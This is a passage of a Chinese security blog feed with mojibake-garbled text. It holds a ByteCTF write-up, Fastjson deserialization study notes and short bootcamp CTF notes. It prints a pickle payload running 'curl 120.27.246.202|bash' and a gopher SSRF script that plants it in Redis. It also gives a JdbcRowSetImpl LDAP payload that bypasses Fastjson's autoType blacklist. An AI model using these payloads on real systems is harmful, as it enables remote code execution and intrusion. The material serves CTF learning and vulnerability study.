ä¸ºcrlfæ¯”è¾ƒç®€å•ã€‚å¯ä»¥ç›´æ¥åŠ ä¸ªå¼•å·æ‹¬èµ·æ¥å†™ã€‚è¿™é‡Œæˆ‘ä»¬åªèƒ½gopheræ‰“ã€‚é‚£ä¹ˆè½¬æ•°æ®æ—¶å‡ºäº†ä¸å°‘éº»çƒ¦ã€‚æœ€åæˆ‘ç®€å•æ”¹äº†ä¸‹redis-ssrfè¿™ä¸ªè„šæœ¬çš„å†…å®¹ã€‚ç”¨python2 è·‘ã€‚ç¡®è®¤å®ƒä¸ä¼šåƒpython3é‚£æ ·è‡ªåŠ¨è½¬ä¹‰æˆ‘çš„16è¿›åˆ¶å­—ç¬¦ä¸²ã€‚ç»ˆäºæ„é€ å‡ºå¯ä»¥æ‰“çš„payload</p><p>python3 è¿è¡Œä»¥å¾—åˆ°pickle 16è¿›åˆ¶åºåˆ—åŒ–æ•°æ®ã€‚py2çš„ç›´æ¥å†™è²Œä¼¼æœ‰ç‚¹é—®é¢˜ã€‚</p><pre><code class="python">import pickleimport osclass exp(object):    def __reduce__(self):        s = &quot;&quot;&quot;curl 120.27.246.202|bash&quot;&quot;&quot;        return (os.system, (s,))e = exp()s = pickle.dumps(e,protocol=2)print(s)</code></pre><p>python2 è¿è¡Œ convert.py<br>æ³¨æ„æˆ‘ä»¬æ‰§è¡Œçš„æ˜¯zaddã€‚å› ä¸ºä¹‹å‰æœ¬åœ°å·²ç»çŸ¥é“äº†requestsæ˜¯zsetç±»å‹æ•°æ®ã€‚</p><pre><code class="python">from urllib import quotedef set_key(key,payload):    cmd=[    &quot;zadd {0} 1 {1}&quot;.format(key,payload),    &quot;quit&quot;    ]    return cmddef redis_format(arr):    CRLF=&quot;\r\n&quot;    redis_arr = arr.split(&quot; &quot;)    cmd=&quot;&quot;    cmd+=&quot;*&quot;+str(len(redis_arr))    for x in redis_arr:        cmd+=CRLF+&quot;$&quot;+str(len((x)))+CRLF+x    cmd+=CRLF    return cmddef generate_payload():    key = &quot;byte:requests&quot;    payload =&quot;&quot;&quot;\x80\x02cposix\nsystem\nq\x00X\x18\x00\x00\x00curl 120.27.246.202|bashq\x01\x85q\x02Rq\x03.&quot;&quot;&quot;.replace(&#39; &#39;,&#39;\x12&#39;)    cmd=set_key(key,payload)    protocol=&quot;gopher://&quot;    ip=&quot;172.20.0.7&quot;    port=&quot;6379&quot;    payload=protocol+ip+&quot;:&quot;+port+&quot;/_&quot;    for x in cmd:        payload += quote(redis_format(x).replace(&quot;^&quot;,&quot; &quot;))    return payloadif __name__==&quot;__main__&quot;:    passwd = &#39;&#39;    p=generate_payload()    print(p.replace(&#39;%12&#39;,&#39;%20&#39;))</code></pre><p>ä¸€ä¸ªå°å‘æ˜¯æˆ‘çš„ç©ºæ ¼æ€»æ˜¯ä¼šè¢«é”™è½¬ã€‚äºæ˜¯å¹²è„†å…ˆæŠŠç©ºæ ¼å¡«å……ä¸€ä¸‹æœ€åå†æ¢å›<code>%20</code>å³å¯ã€‚</p><p>æ‰“æœ¬åœ°æˆäº†åï¼Œè¿œç¨‹å¿…ç„¶æ²¡æœ‰é—®é¢˜äº†ã€‚<br>æœ€åå› ä¸ºgetä¼ å‚,æˆ‘ä»¬æ³¨æ„äºŒæ¬¡urlç¼–ç å³å¯ã€‚æ‰§è¡Œå‘½ä»¤<code>curl xxx|bash</code><br>(è¯»æ–‡ä»¶ç¡®è®¤æœ‰bash,pycurlç¡®è®¤æœ‰curl,åŒæ—¶ä¹‹å‰æŠŠå‘½ä»¤å¾€tmpä¸‹å†™æ—¶å‘ç°æœ‰readflag)</p><p>getshell :)<br><img src="https://i.imgur.com/7afkg9s.png" class="lazyload" data-srcset="https://i.imgur.com/7afkg9s.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><h2 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h2><p>  æ‰€ä»¥éå¸¸å¯æƒœã€‚åˆ©ç”¨é“¾æƒ³å¥½åç»“æœå»èµ¶é£æœºé”™è¿‡äº†æ¯”èµ›ä¸­è§£å‡ºçš„æœºä¼šã€‚ä¸è¿‡æ€è·¯è¿˜æ˜¯å¾ˆè€ƒéªŒäººçš„ã€‚é¢˜ç›®è´¨é‡å¾ˆé«˜ã€‚å°±æ˜¯æœ¬åœ°ç¯å¢ƒæœ‰ç‚¹ç£¨äººã€‚ã€‚ã€‚</p><p>æœ€ååˆ†äº«ä¸‹æˆ‘æŒ‰ç…§æºç æ­å¥½çš„dockerç¯å¢ƒã€‚<br><a href="https://github.com/baiyecha404/CTFWEBchallenge/tree/master/bytectf2020/easyscrapy" target="_blank" rel="noopener">https://github.com/baiyecha404/CTFWEBchallenge/tree/master/bytectf2020/easyscrapy</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> CTF </tag>
            
            <tag> wp </tag>
            
            <tag> redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å­¦ä¹ ç¬”è®°-Javaæ·±å…¥</title>
      <link href="2020/10/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E6%B7%B1%E5%85%A5/"/>
      <url>2020/10/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E6%B7%B1%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>javaç»§ç»­å¼€å‘å­¦ä¹ ã€‚çœ‹åˆ°å“ªä¸ªå­¦å“ªä¸ªï¼Œshiroæ‡’å¾—çœ‹äº†ã€‚</p><a id="more"></a><h1 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h1><p>expåˆ©ç”¨ä¸å¿…å¤šè¯´ï¼Œä¸»è¦æ˜¯å­¦ä¹ ä¸‹åŸç†ã€‚ä»¥ä¸‹éƒ½åœ¨jdk1.8è°ƒè¯•ã€‚</p><p>å¯ä»¥æŒ‰wh1t3p1gå¸ˆå‚…çš„åšæ–‡å­¦ä¹ ã€‚<br><a href="https://blog.0kami.cn/2020/04/13/talk-about-fastjson-deserialization/" target="_blank" rel="noopener">https://blog.0kami.cn/2020/04/13/talk-about-fastjson-deserialization/</a></p><p>ä¸‰ä¸ªdemoç±»</p><pre><code class="java">public class Person {    public String name;    public Phone phone;    public Person() {    }    public Person(String name, Phone phone) {        this.name = name;        this.phone = phone;    }    @Override    public String toString(){        return name+&quot;:&quot;+phone;    }}</code></pre><pre><code class="java">public class Phone {    public String phoneNumber;    public Phone() {    }    public Phone(String phoneNumber) {        this.phoneNumber = phoneNumber;    }    public String toString(){        return this.phoneNumber;    }}</code></pre><pre><code class="java">public class NewPhone extends Phone {    public String location;    public NewPhone(){    }    public NewPhone(String phoneNumber, String location) {        this.phoneNumber = phoneNumber;        this.location = location;    }    public String toString(){        return this.phoneNumber+&quot;:&quot;+this.location;    }}</code></pre><p>fastjsonåº“ä¸€èˆ¬æˆ‘ä»¬é‡ç‚¹å…³æ³¨å‡ ä¸ªåŸºæœ¬åŠŸèƒ½æ–¹æ³•</p><ul><li><code>JSON.toJSONString()</code></li><li><code>JSON.parse()</code></li><li><code>JSON.parseObject()</code></li></ul><p>Test</p><pre><code class="java">import com.alibaba.fastjson.JSON;public class Test {    public static void main(String[] args) {        Person person = new Person(&quot;byc_404&quot;,new Phone(&quot;123123123&quot;));        //Person person = new Person(&quot;byc_404&quot;,new NewPhone(&quot;123123123&quot;,&quot;china&quot;));        String json = JSON.toJSONString(person);        System.out.println(json);        Person p = JSON.parseObject(json, Person.class);        System.out.println(p);    }}//ouput://1.//{&quot;name&quot;:&quot;byc_404&quot;,&quot;phone&quot;:{&quot;phoneNumber&quot;:&quot;123123123&quot;}}//byc_404:123123123//2.//{&quot;name&quot;:&quot;byc_404&quot;,&quot;phone&quot;:{&quot;location&quot;:&quot;china&quot;,&quot;phoneNumber&quot;:&quot;123123123&quot;}}//byc_404:123123123</code></pre><p>è¿™é‡Œæœ€æ˜¾è‘—çš„é—®é¢˜å°±æ˜¯ã€‚æˆ‘ä»¬ä¸¤æ¬¡æ‰§è¡Œä»£ç æ—¶åœ¨<code>parseObject</code>åè¾“å‡ºçš„ç»“æœæ˜¯ä¸€è‡´çš„ã€‚è¿™æ˜¾ç„¶ä¸ç¬¦åˆæˆ‘ä»¬çš„é¢„æœŸ,å› ä¸ºè¿™ç›´æ¥ä¸¢å¤±äº†newphoneç±»çš„locationå±æ€§ã€‚</p><blockquote><p>ç”±äºfastjsonä¸çŸ¥é“éœ€è¦è¿˜åŸçš„Personçš„Phoneæ˜¯æœ¬èº«è¿˜æ˜¯å­ç±»NewPhoneï¼Œé¢å¯¹è¿™ç§å¤šæ€æ–¹å¼ï¼Œfastjsonè¿˜åŸçš„æ˜¯çˆ¶ç±»ï¼Œè€Œä¸æ˜¯å­ç±»NewPhone</p></blockquote><p>åœ¨è¿™ç§æƒ…å†µä¸‹å°±äº§ç”Ÿäº†autotype.æˆ‘ä»¬å°†ä¸Šé¢<code>TOJSONString</code>è¿™è¡Œä»£ç æ›´æ”¹ä¸‹</p><pre><code class="java">String json = JSON.toJSONString(person, SerializerFeature.WriteClassName);//output//{&quot;@type&quot;:&quot;Person&quot;,&quot;name&quot;:&quot;john&quot;,&quot;phone&quot;:{&quot;@type&quot;:&quot;NewPhone&quot;,&quot;location&quot;:&quot;china&quot;,&quot;phoneNumber&quot;:&quot;123123123&quot;}}//john:123123123:china</code></pre><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°<code>@type</code>å¸®åŠ©æˆ‘ä»¬é¿å…äº†å­ç±»ä¸¢å¤±å­—æ®µçš„é—®é¢˜,æˆåŠŸè¿˜åŸäº†å¯¹è±¡ã€‚ä½†æ˜¯æˆ‘ä»¬è‡ªç„¶å¯ä»¥æƒ³åˆ°,å¦‚æœå°†å…¶æŒ‡å®šä¸ºæ¶æ„ç±»,å°±å¯èƒ½å¯¼è‡´æ¶æ„ä»£ç æ‰§è¡Œäº†ã€‚è¿™å°±æ˜¯æœ€æ—©çš„fastjsonç‰ˆæœ¬çš„rceæ¼æ´ã€‚</p><p>ç„¶åå› ä¸ºæœ¬åœ°jdk1.8ç‰ˆæœ¬å¤ªé«˜å°±ä¸å¤ç°äº†â€¦â€¦æ‰“æ³•è‡ªç„¶æ˜¯rmi / ldapä¸¤ç§æ–¹æ³•ã€‚</p><p>è¿™é‡Œæä¸€ä¸‹fastjsonä¹‹æ‰€ä»¥èƒ½æ‰§è¡Œä¸€ç³»åˆ—æ–¹æ³•çš„èµ·å› :fastjson è‡ªåŠ¨è°ƒç”¨getterå’Œsetterä»¥åŠæ— å‚æ•°çš„æ„é€ å‡½æ•°</p><p>è¿™é‡Œä¸æ·±å…¥è·Ÿ,ç›´æ¥ç»™å‡ºç»“è®º<br>setteræå–æ¡ä»¶ï¼š</p><ul><li>å‡½æ•°åé•¿åº¦å¤§äºç­‰äº4</li><li>éé™æ€å‡½æ•°</li><li>é™åˆ¶è¿”å›ç±»å‹ä¸ºvoidæˆ–å½“å‰ç±»</li><li>å‡½æ•°å‚æ•°åªæœ‰ä¸€ä¸ª</li><li>å‡½æ•°åä»¥setå¼€å¤´ï¼Œç¬¬å››ä¸ªå­—ç¬¦æ˜¯å¤§å†™æˆ–è€…unicdeæˆ–è€…_æˆ–è€…å­—æ¯fï¼›å¦‚æœå‡½æ•°åé•¿åº¦&gt;=5ï¼Œçœ‹ç¬¬5ä½å­—ç¬¦æ˜¯ä¸æ˜¯å¤§å†™çš„</li></ul><p>getteræå–æ¡ä»¶ï¼š</p><ul><li>å‡½æ•°åé•¿åº¦å¤§äºç­‰äº4</li><li>éé™æ€å‡½æ•°</li><li>å‡½æ•°åä»¥getå¼€å¤´ï¼Œç¬¬å››ä¸ªå­—ç¬¦å¤§å†™</li><li>å‡½æ•°å‚æ•°ä¸º0ä¸ª</li><li>å‡½æ•°çš„è¿”å›ç±»å‹ä¸ºCollectionçš„å­ç±»æˆ–æœ¬èº«ã€Mapçš„å­ç±»æˆ–æœ¬èº«ã€ AtomicBooleanã€AtomicIntegerã€AtomicLong<br>æ— ç›¸å¯¹åº”çš„setterå‡½æ•°</li></ul><blockquote><p>ç»è¿‡ä¸Šè¿°çš„ä¸¤ä¸ªæ¡ä»¶æå–åï¼Œä¿ç•™äº†ç¬¦åˆæ¡ä»¶çš„getterå’Œsetterï¼Œå¹¶äºcom/alibaba/fastjson/parser/deserializer/FieldDeserializer.java#setValueå‡½æ•°ä¸­invokeè°ƒç”¨ï¼Œä¹Ÿå°±æ˜¯è¯´å®ç°äº†ç±»ä¼¼ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ä¸»åŠ¨è°ƒç”¨readObjectå‡½æ•°çš„æ•ˆæœã€‚</p></blockquote><p>ç”±æ¡ä»¶ï¼Œæ­¤æ—¶å¯ä»¥åˆ©ç”¨ä¼ å…¥æŸå­—æ®µçš„æ–¹å¼æ¥ä¸»åŠ¨è°ƒç”¨ç›¸å…³ç¬¦åˆæ¡ä»¶çš„setterå’Œgetterã€‚ä¾‹å¦‚åœ¨Personé‡Œé¢æ·»åŠ ä¸€ä¸ªsetTestå‡½æ•°ï¼Œå¹¶åœ¨éœ€è¦è½¬åŒ–çš„jsonä¸­æ·»åŠ â€testâ€:1ï¼Œè¿™å°†ä¼šä¸»åŠ¨è°ƒç”¨setTestã€‚<br>å¦‚ä¸‹</p><pre><code class="java">public void setTest(String test) {    this.test = test;    System.out.println(&quot;setTest Method called!&quot;);}</code></pre><pre><code class="java">String json=&quot;{\&quot;name\&quot;:\&quot;byc_404\&quot;,\&quot;phone\&quot;:{\&quot;phoneNumber\&quot;:\&quot;123123123\&quot;},\&quot;test\&quot;:\&quot;1\&quot;}&quot;;Person p = JSON.parseObject(json, Person.class);System.out.println(p);//output://setTest Method called!//byc_404:123123123</code></pre><p><strong>æˆ‘ä»¬åœ¨åˆ©ç”¨@typeæ„é€ æœ‰å±å®³çš„åˆ©ç”¨é“¾æ—¶ï¼Œä¸»è¦å°±æ˜¯æŸ¥æ‰¾æœ‰å±å®³çš„æ— å‚æ•°çš„æ„é€ å‡½æ•°ã€ç¬¦åˆæ¡ä»¶çš„getterå’Œsetterã€‚</strong></p><h2 id="1-2-24-ä¿®å¤-bypass"><a href="#1-2-24-ä¿®å¤-bypass" class="headerlink" title="1.2.24 ä¿®å¤ bypass"></a>1.2.24 ä¿®å¤ bypass</h2><p>ç„¶åæ”¹ä¸‹mavené‡Œfastjsonä¾èµ–çœ‹çœ‹é«˜ä¸€ä¸ªç‰ˆæœ¬çš„fastjsoné˜²æŠ¤ã€‚å‘ç°å¤šäº†ä¸€ä¸ªcheckAutoTypeæ–¹æ³•ã€‚å½“ç„¶è¿™ä¸ªç‰ˆæœ¬åŒæ—¶éœ€è¦æ‰‹åŠ¨å¼€å¯autoType.</p><pre><code class="java">if (this.autoTypeSupport || expectClass != null) {    int i;    String deny;    for(i = 0; i &lt; this.acceptList.length; ++i) {        deny = this.acceptList[i];        if (className.startsWith(deny)) {            return TypeUtils.loadClass(typeName, this.defaultClassLoader);        }    }    for(i = 0; i &lt; this.denyList.length; ++i) {        deny = this.denyList[i];        if (className.startsWith(deny)) {            throw new JSONException(&quot;autoType is not support. &quot; + typeName);        }    }}</code></pre><p>è¿™é‡Œåšäº†ä¸€æ¬¡ç™½åå•ä¸€æ¬¡é»‘åå•çš„æ£€æŸ¥ã€‚ä¼˜å…ˆè½½å…¥æ‰‹å·¥é…ç½®çš„ç™½åå•ç±»ï¼Œå¹¶å¯¹é»‘åå•ç±»çˆ†å‡ºå¼‚å¸¸ã€‚<br>ç„¶ååé¢ç»§ç»­è°ƒç”¨æ—¶,å¦‚æœä¸ç¬¦åˆå‰é¢çš„æƒ…å†µï¼Œåé¢å°±ä¼šè¿›å…¥è¿™ä¸€æ®µ</p><pre><code class="java">for(i = 0; i &lt; this.acceptList.length; ++i) {    accept = this.acceptList[i];    if (className.startsWith(accept)) {        clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader);        if (expectClass != null &amp;&amp; expectClass.isAssignableFrom(clazz)) {            throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());        }        return clazz;    }}</code></pre><p>è·Ÿè¿›<code>loadClass</code>.</p><pre><code class="java">if (clazz != null) {        return clazz;    } else if (className.charAt(0) == &#39;[&#39;) {        Class&lt;?&gt; componentType = loadClass(className.substring(1), classLoader);        return Array.newInstance(componentType, 0).getClass();    } else if (className.startsWith(&quot;L&quot;) &amp;&amp; className.endsWith(&quot;;&quot;)) {        String newClassName = className.substring(1, className.length() - 1);        return loadClass(newClassName, classLoader);    } else {                ......</code></pre><p>åœ¨é»‘åå•æ£€æµ‹ä¹‹åï¼Œå½“å¼€å¤´æœ‰<code>[</code>æˆ–è€…å¼€å¤´æœ‰<code>L</code>å’Œç»“å°¾æœ‰<code>;</code>æ—¶ä¼šå»æ‰è¿™äº›å­—ç¬¦ï¼Œä»è€Œé€ æˆäº†é»‘åå•çš„ç»•è¿‡ã€‚å› ä¸ºå®ƒæ˜¯ç”¨startswithæ£€æµ‹é»‘åå•çš„ã€‚</p><h2 id="1-2-42-bypass"><a href="#1-2-42-bypass" class="headerlink" title="1.2.42 bypass"></a>1.2.42 bypass</h2><p>ç„¶åä¸Šé¢é‚£ä¸ªbypassçš„ä¿®å¤ä¸»è¦æ˜¯</p><p><img src="/2020/10/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E6%B7%B1%E5%85%A5/0.PNG" class="lazyload" data-srcset="%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E6%B7%B1%E5%85%A5/0.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æŠŠé»‘åå•å…¨éƒ¨æ¢æˆhashé˜²æ­¢æ·±å…¥æ˜¯è¿™ä¸ªç‰ˆæœ¬çš„ç‰¹ç‚¹,åŒæ—¶ä¸Šé¢è¿™ä¸ªä»£ç çš„ä½œç”¨æ˜¯å¦‚æœæ»¡è¶³æŸä¸ªæ¡ä»¶çš„è¯å°±å»æ‰é‚£äº›<code>Lxxx;</code>çš„å‰åç¬¬ä¸€ä¸ªå­—ç¬¦ã€‚<br>ç„¶è€Œä¿®å¤æ²»æ ‡ä¸æ²»æœ¬ï¼Œè¯´å®è¯æœ‰ç‚¹è ¢,è¿™é‡Œåªéœ€è¦<code>LLxxx;;</code>å°±èƒ½ç»•äº†ã€‚<br>è€Œä¸”é»‘åå•hashä¹Ÿæœ‰dalao æµ‹è¿‡çš„ã€‚ä¹‹å‰çœ‹LandGreyä½¬æ”¶è—è¿‡ï¼Œ<br><a href="https://github.com/LeadroyaL/fastjson-blacklist" target="_blank" rel="noopener">https://github.com/LeadroyaL/fastjson-blacklist</a></p><h2 id="1-2-47-bypass"><a href="#1-2-47-bypass" class="headerlink" title="1.2.47 bypass"></a>1.2.47 bypass</h2><p>1.2.48ä»¥å‰çš„checkAutoTyyeæœ‰è¿™æ ·ä¸€æ®µä»£ç ã€‚</p><pre><code class="java">if (Arrays.binarySearch(this.denyHashCodes, hash) &gt;= 0 &amp;&amp; TypeUtils.getClassFromMapping(typeName) == null) {    throw new JSONException(&quot;autoType is not support. &quot; + typeName);}......public static Class&lt;?&gt; getClassFromMapping(String className) {    return (Class)mappings.get(className);}</code></pre><p>è¿™é‡Œå¾ˆå¥‡æ€ªçš„ifçš„æ¡ä»¶å¯¼è‡´ï¼šå³ä½¿å‰é¢æœåˆ°äº†é»‘åå•é‡Œçš„ç±»ï¼Œå¦‚æœmappingsé‡Œé¢å­˜åœ¨è¿™ä¸ªç±»,é‚£ä¹ˆä»å¯ä»¥è¿›è¡Œä¸‹ä¸€æ­¥æ“ä½œã€‚<br>è¿™é‡Œçš„mappingsæ˜¯fastjsonææ—©è½½å…¥çš„ä¸€äº›ç¼“å­˜ç±»</p><p>é‚£ä¹ˆå‡å¦‚å¯ä»¥å°†æ¶æ„ç±»åŠ å…¥mappingså°±èƒ½æœ‰ç»•è¿‡çš„æ•ˆæœäº†ã€‚</p><p>è¿™é‡Œæˆ‘ä»¬ç»§ç»­è·Ÿè¿›</p><pre><code class="java">if (clazz == null) {    clazz = TypeUtils.getClassFromMapping(typeName);}if (clazz == null) {    clazz = this.deserializers.findClass(typeName);}if (clazz != null) {    if (expectClass != null &amp;&amp; clazz != HashMap.class &amp;&amp; !expectClass.isAssignableFrom(clazz)) {        throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());    } else {        return clazz;    }</code></pre><p>é’ˆå¯¹deserializers.findClass,è¿™é‡Œç±»ä¸­æœ‰ä¸€ä¸ªåˆå§‹æ–¹æ³•ï¼Œåœ¨deserializersé‡Œé¢é¢„å…ˆå¡«å……äº†ä¸€äº›ç±»ä¸å…¶ååºåˆ—åŒ–å™¨çš„å®ä¾‹ã€‚</p><p><img src="/2020/10/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E6%B7%B1%E5%85%A5/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>å…¶ä¸­åŒ…æ‹¬ä¸€ä¸ª</p><pre><code class="java"> this.deserializers.put(Class.class, MiscCodec.instance);</code></pre><p>é‡ç‚¹åœ¨ç»è¿‡autotypeæ£€æŸ¥åMiscCodecè¿™ä¸ªååºåˆ—åŒ–å™¨æ˜¯æ€ä¹ˆå¤„ç†Class.classçš„ã€‚</p><pre><code class="java">if (clazz == Class.class) {    return TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());} </code></pre><p>è€Œ<code>TypeUtils.loadClass</code>éå¸¸å¥½ç”¨.ä»–å°†ä½¿ç”¨ClassLoader.loadClassæˆ–Class.forNameæ¥è½½å…¥ç±»ï¼Œåœ¨è¿™ä¸€è¿‡ç¨‹ä¸­ï¼Œæ¶‰åŠåˆ°äº†mappingsçš„æ“ä½œ,å³è°ƒç”¨äº†<code>mappings.put(className,clazz)</code>.é‚£ä¹ˆè¿™æ ·çš„è¯ä¼šç›´æ¥å°†è½½å…¥åçš„å¯¹è±¡å¡«å…¥mappingsã€‚</p><p>é‚£ä¹ˆåªè¦æå‰å°†æ¶æ„ç±»è½½å…¥mappingså°±å¥½äº†ã€‚</p><pre><code class="java">json = &quot;{{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},{\"@type\": \"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\": \"ldap://localhost:1389/Exploit\",\"autoCommit\": true}}&quot;;</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bootcamp-2020&amp;&amp;mctf-2020</title>
      <link href="2020/10/05/bootcamp-2020&amp;mctf-2020/"/>
      <url>2020/10/05/bootcamp-2020&amp;mctf-2020/</url>
      
        <content type="html"><![CDATA[<p>  å›½åº†æ”¾å‡ä¸€ç›´åœ¨åˆ·é¢˜,å¤§æ¦‚æ˜¯å› ä¸ºå›½èµ›è‡ªå·±æ‰“çš„å¤ªçƒ‚äº†å§â€¦..æ„Ÿè§‰æœ‰ä¸å°‘ä¸œè¥¿è¿˜æ˜¯å¯ä»¥ç²¾è¿›çš„ã€‚</p><p>  ç„¶åå¤´å‡ å¤©æ€¼äº†ä¸‹htbçš„å‡ é“challenge.ä¸€ä¸ªåšäº†å¾ˆä¹…çš„é¢˜ç»ˆäºæ€¼å‡ºæ¥äº†,è¿˜æœ‰ä¸€é“æ–°é¢˜å¡ä½äº†,å¦ä¸€é“éš¾é¢˜ä»¥ä¸ºæœ‰äº†çªç ´ç»“æœå‘ç°æºç æ”¹äº†ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ä¸è¿‡æœ€åç»ˆäºæ€¼å‡ºæ¥äº†2333.äºæ˜¯è¿™ä¸¤å¤©å°±æ‰“äº†ä¸‹ctftimeä¸Šçš„ä¸¤ä¸ªctfæ”¾æ¾ä¸‹ã€‚ bootcamp-2020æ˜¯b01lersåŠçš„æ–°æ‰‹èµ›è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„,å°±æ˜¯luaé‚£é¢˜æˆ‘æ€ä¹ˆä¹Ÿæ²¡æƒ³åˆ°å®ƒwebsocketç«¯å£æ˜¯å¯¹å¤–çš„ã€‚å¦ä¸€ä¸ªm*ctf2020æŒºæœ‰æ„æ€ï¼Œéš¾åº¦æœ‰ç‚¹é«˜ã€‚è€Œä¸”å…¶ä¸­é™¤äº†webè¿™ä¸ªåˆ†ç±»è¿˜æœ‰ä¸“é—¨ä¸€ä¸ªååºåˆ—åŒ–åˆ†ç±»ï¼Œæ¯”è¾ƒæœ‰è¶£ã€‚ç›®å‰ä»–ä»¬éƒ½å·²ç»å¼€æ”¾ä»“åº“ï¼Œæ„Ÿå…´è¶£çš„ä¹Ÿå¯ä»¥å»çœ‹çœ‹ :)<br><a href="https://github.com/b01lers/bootcamp-2020" target="_blank" rel="noopener">https://github.com/b01lers/bootcamp-2020</a></p><p><a href="https://gitlab.com/mctf/quals-2020" target="_blank" rel="noopener">https://gitlab.com/mctf/quals-2020</a></p><h2 id="bootcampCTF-2020"><a href="#bootcampCTF-2020" class="headerlink" title="bootcampCTF-2020"></a>bootcampCTF-2020</h2><p>åšé¢˜æ—¶ç®€å•åšçš„ç¬”è®°ã€‚æ‰€ä»¥æ²¡å›¾ã€‚å°†å°±çœ‹å§</p><h3 id="Find-That-Data"><a href="#Find-That-Data" class="headerlink" title="Find That Data!"></a>Find That Data!</h3><p>æ•´ä½“ä¸Šæ˜¯ä¸ªé™æ€åŠŸèƒ½ã€‚é¦–å…ˆç™»é™†ç•Œé¢jsä¸­æç¤ºå­˜åœ¨<code>/maze</code>è·¯ç”±ã€‚æ¥ä¸‹æ¥å‘ç°maze.jsä¸­å®šä¹‰</p><pre><code class="javascript">function check_data() {  if (x === 1 &amp;&amp; y === maxRows) {    $.post(&quot;/mem&quot;, { token: $(&quot;#token&quot;).html() }).done(function(data) {      alert(&quot;Memory: &quot; + data);    });  }}</code></pre><p>post<code>/mem</code>ä¼ é€’<code>token=xxx</code>å³å¯ã€‚tokené€šè¿‡è®¿é—®<code>/token</code>å³å¯è·å¾—ã€‚å¤§æ¦‚å‡ ç§’åˆ·æ–°ä¸€æ¬¡ã€‚</p><h3 id="Programs-Only"><a href="#Programs-Only" class="headerlink" title="Programs Only"></a>Programs Only</h3><p>å®è¯è¯´çœŸçš„è„‘æ´ã€‚è¦ä¸æ˜¯å› ä¸ºæƒ³èµ·æ¥å›½é™…èµ›ç»å¸¸æœ‰è¿™ç§pythonåç«¯æ”¾robots.txtçš„æ“ä½œæˆ‘çœŸæä¸å‡ºæ¥ã€‚</p><pre><code>User-agent: ProgramAllow: /program/User-agent: Master Control Program 0000Allow: /program/control</code></pre><p>æ”¹UAè®¿é—®åä¸€ä¸ªå³å¯</p><h3 id="Reindeer-Flotilla"><a href="#Reindeer-Flotilla" class="headerlink" title="Reindeer Flotilla"></a>Reindeer Flotilla</h3><p>flagåœ¨åŠ äº†æ··æ·†çš„jsé‡Œ</p><h3 id="First-Day-Inspection"><a href="#First-Day-Inspection" class="headerlink" title="First Day Inspection"></a>First Day Inspection</h3><p>flagä¸€éƒ¨åˆ†åœ¨åŠ äº†æ··æ·†çš„jsé‡Œå‰©ä¸‹çš„å››å¤„æ‰¾æ‰¾å°±å®Œäº†ã€‚</p><h3 id="EnFlaskCom"><a href="#EnFlaskCom" class="headerlink" title="EnFlaskCom"></a>EnFlaskCom</h3><p>æœ‰ç‚¹æ„æ€ã€‚ç»™äº†ä¸¤ä¸ªcookie.ä¸€ä¸ªcookie useræ˜æ˜¾æ˜¯pickleåºåˆ—åŒ–æ•°æ®çš„16è¿›åˆ¶ã€‚ä¸è¿‡å¦ä¸€ä¸ªcookie signatureåªèƒ½çœ‹å‡ºæ˜¯256ä½ã€‚ä¸çŸ¥é“ç®—æ³•ã€‚</p><p>å­˜åœ¨æŠ¥é”™ï¼Œé‚£ä¹ˆå¯ä»¥ç®€å•å°è¯•æ›´æ¢cookieçˆ†å‡ºéƒ¨åˆ†æºç 